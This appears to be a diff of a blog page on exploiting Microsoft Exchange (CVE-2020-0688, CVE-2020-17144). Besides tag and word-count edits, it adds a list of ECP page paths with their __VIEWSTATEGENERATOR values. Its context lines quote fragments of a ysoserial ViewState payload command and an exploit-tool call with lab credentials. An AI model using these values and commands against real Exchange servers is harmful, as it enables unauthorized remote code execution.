@@ -440,10 +440,6 @@
                                 <span class="chip bg-color">Exchange</span>
                             </a>
                         
-                            <a href="/tags/RCE/">
-                                <span class="chip bg-color">RCE</span>
-                            </a>
-                        
                             <a href="/tags/CVE-2020-17144/">
                                 <span class="chip bg-color">CVE-2020-17144</span>
                             </a>
@@ -454,6 +450,10 @@
                         
                             <a href="/tags/CVE-2020-0688/">
                                 <span class="chip bg-color">CVE-2020-0688</span>
+                            </a>
+                        
+                            <a href="/tags/RCE/">
+                                <span class="chip bg-color">RCE</span>
                             </a>
                         
                     </div>
@@ -491,14 +491,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    1.2k
+                    1.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    7 Min
+                    9 Min
                 </div>
                 
 
@@ -618,7 +618,7 @@ ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;ping t00ls.XX
 <pre class="line-numbers language-none"><code class="language-none">go to payload <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.33.19.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">you web mustbe become 500<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">your web code should become 500<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.33.24.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">confirm the dns log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -677,6 +677,57 @@ exchange -s https:&#x2F;&#x2F;192.168.3.144&#x2F; -u micle@rootkit.org -p Admin1
 
 <p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.42.42.png"></p>
 <p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.42.56.png"></p>
+<h3 id="Another-can-be-use-dir-amp-VIEWSTATEGENERATOR"><a href="#Another-can-be-use-dir-amp-VIEWSTATEGENERATOR" class="headerlink" title="Another can be use dir &amp; __VIEWSTATEGENERATOR"></a>Another can be use dir &amp; __VIEWSTATEGENERATOR</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;ecp&#x2F;PersonalSettings&#x2F;HomePage.aspx?showhelp&#x3D;false&amp;
+__VIEWSTATEGENERATOR&#x3D;1D01FD4E
+
+&#x2F;ecp&#x2F;PersonalSettings&#x2F;HomePage.aspx?showhelp&#x3D;false&amp;
+__VIEWSTATEGENERATOR&#x3D;1D01FD4E
+
+&#x2F;ecp&#x2F;Organize&#x2F;AutomaticReplies.slab?showhelp&#x3D;false&amp;
+__VIEWSTATEGENERATOR&#x3D;FD338EE0
+
+&#x2F;ecp&#x2F;RulesEditor&#x2F;InboxRules.slab?showhelp&#x3D;false&amp;
+__VIEWSTATEGENERATOR&#x3D;FD338EE0
+
+&#x2F;ecp&#x2F;Organize&#x2F;DeliveryReports.slab?showhelp&#x3D;false&amp;
+__VIEWSTATEGENERATOR&#x3D;FD338EE0
+
+&#x2F;ecp&#x2F;MyGroups&#x2F;PersonalGroups.aspx?showhelp&#x3D;false&amp;
+__VIEWSTATEGENERATOR&#x3D;A767F62B
+
+&#x2F;ecp&#x2F;MyGroups&#x2F;ViewDistributionGroup.aspx?pwmcid&#x3D;1&amp;id&#x3D;38f4bec5-704f-4272-a654-95d53150e2ae&amp;ReturnObjectType&#x3D;1
+__VIEWSTATEGENERATOR&#x3D;321473B8
+
+&#x2F;ecp&#x2F;Customize&#x2F;Messaging.aspx?showhelp&#x3D;false&amp;
+__VIEWSTATEGENERATOR&#x3D;9C5731F0
+
+&#x2F;ecp&#x2F;Customize&#x2F;General.aspx?showhelp&#x3D;false&amp;
+__VIEWSTATEGENERATOR&#x3D;72B13321
+
+&#x2F;ecp&#x2F;Customize&#x2F;Calendar.aspx?showhelp&#x3D;false&amp;
+__VIEWSTATEGENERATOR&#x3D;4AD51055
+
+&#x2F;ecp&#x2F;Customize&#x2F;SentItems.aspx?showhelp&#x3D;false&amp;
+ __VIEWSTATEGENERATOR&#x3D;4466B13F
+
+&#x2F;ecp&#x2F;PersonalSettings&#x2F;Password.aspx?showhelp&#x3D;false&amp;
+__VIEWSTATEGENERATOR&#x3D;59543DCA
+
+&#x2F;ecp&#x2F;SMS&#x2F;TextMessaging.slab?showhelp&#x3D;false&amp;
+__VIEWSTATEGENERATOR&#x3D;FD338EE0
+
+&#x2F;ecp&#x2F;TroubleShooting&#x2F;MobileDevices.slab?showhelp&#x3D;false&amp;
+__VIEWSTATEGENERATOR&#x3D;FD338EE0
+
+&#x2F;ecp&#x2F;Customize&#x2F;Regional.aspx?showhelp&#x3D;false&amp;
+__VIEWSTATEGENERATOR&#x3D;9097CD08
+
+&#x2F;ecp&#x2F;MyGroups&#x2F;SearchAllGroups.slab?pwmcid&#x3D;3&amp;ReturnObjectType&#x3D;1
+__VIEWSTATEGENERATOR&#x3D;FD338EE0
+
+&#x2F;ecp&#x2F;Security&#x2F;BlockOrAllow.aspx?showhelp&#x3D;false&amp;
+__VIEWSTATEGENERATOR&#x3D;362253EF<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 
                 
             </div>
@@ -749,10 +800,6 @@ exchange -s https:&#x2F;&#x2F;192.168.3.144&#x2F; -u micle@rootkit.org -p Admin1
                                     <span class="chip bg-color">Exchange</span>
                                 </a>
                             
-                                <a href="/tags/RCE/">
-                                    <span class="chip bg-color">RCE</span>
-                                </a>
-                            
                                 <a href="/tags/CVE-2020-17144/">
                                     <span class="chip bg-color">CVE-2020-17144</span>
                                 </a>
@@ -763,6 +810,10 @@ exchange -s https:&#x2F;&#x2F;192.168.3.144&#x2F; -u micle@rootkit.org -p Admin1
                             
                                 <a href="/tags/CVE-2020-0688/">
                                     <span class="chip bg-color">CVE-2020-0688</span>
+                                </a>
+                            
+                                <a href="/tags/RCE/">
+                                    <span class="chip bg-color">RCE</span>
                                 </a>
                             
                         </div>
@@ -855,10 +906,6 @@ exchange -s https:&#x2F;&#x2F;192.168.3.144&#x2F; -u micle@rootkit.org -p Admin1
                         <span class="chip bg-color">Exchange</span>
                     </a>
                     
-                    <a href="/tags/RCE/">
-                        <span class="chip bg-color">RCE</span>
-                    </a>
-                    
                     <a href="/tags/CVE-2020-17144/">
                         <span class="chip bg-color">CVE-2020-17144</span>
                     </a>
@@ -869,6 +916,10 @@ exchange -s https:&#x2F;&#x2F;192.168.3.144&#x2F; -u micle@rootkit.org -p Admin1
                     
                     <a href="/tags/CVE-2020-0688/">
                         <span class="chip bg-color">CVE-2020-0688</span>
+                    </a>
+                    
+                    <a href="/tags/RCE/">
+                        <span class="chip bg-color">RCE</span>
                     </a>
                     
                 </div>
@@ -923,6 +974,10 @@ exchange -s https:&#x2F;&#x2F;192.168.3.144&#x2F; -u micle@rootkit.org -p Admin1
                         <span class="chip bg-color">Exchange</span>
                     </a>
                     
+                    <a href="/tags/RCE/">
+                        <span class="chip bg-color">RCE</span>
+                    </a>
+                    
                     <a href="/tags/ProxyLogon/">
                         <span class="chip bg-color">ProxyLogon</span>
                     </a>
@@ -933,10 +988,6 @@ exchange -s https:&#x2F;&#x2F;192.168.3.144&#x2F; -u micle@rootkit.org -p Admin1
                     
                     <a href="/tags/CVE-2021-27065/">
                         <span class="chip bg-color">CVE-2021-27065</span>
-                    </a>
-                    
-                    <a href="/tags/RCE/">
-                        <span class="chip bg-color">RCE</span>
                     </a>
                     
                 </div>
@@ -1176,7 +1227,7 @@ exchange -s https:&#x2F;&#x2F;192.168.3.144&#x2F; -u micle@rootkit.org -p Admin1
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">7k</span>&nbsp;字
+                class="white-color">7.3k</span>&nbsp;字
             
             
             
